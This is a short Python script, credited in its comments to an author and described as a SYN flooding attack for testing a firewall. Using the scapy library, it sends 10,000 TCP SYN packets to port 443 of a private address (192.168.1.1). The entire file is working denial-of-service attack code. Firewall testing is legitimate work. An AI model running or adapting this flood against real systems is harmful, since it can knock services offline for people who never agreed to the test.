#!/usr/bin/python
#This script is written by "MortezaLSC" on Sunday, 5 2014 at 10:35 PM
#It does syn flooding attack for testing the firewall

import sys
from scapy.all import *

i = IP()
i.dst="192.168.1.1"

t = TCP()
t.dport=443
t.flags="S"

for n in range(0,10000):
    send(i/t)
